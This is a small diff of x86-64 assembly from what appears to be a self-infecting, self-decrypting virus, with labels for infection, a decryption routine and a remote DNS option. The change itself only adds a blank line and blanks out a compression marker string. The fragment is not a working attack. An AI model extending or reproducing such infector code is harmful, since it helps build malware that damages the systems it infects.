@@ -42,6 +42,7 @@ _infect_push:
 	sub rsi, rdi ;cmpr_end - cmpr_start
 	lea rdx, [rel key]
 	call DECRYPT_ROUTINE
+
 	jmp start2
 
 dataearly:
@@ -69,7 +70,7 @@ do_dns_remote: db `\0`
 print_msg: db `\0`
 aligner: db `0000`
 ;2
-iscompressed: db `CMPRESS\0`
+iscompressed: db `\0\0\0\0\0\0\0\0`
 ;3
 environ: db `00000000`
 
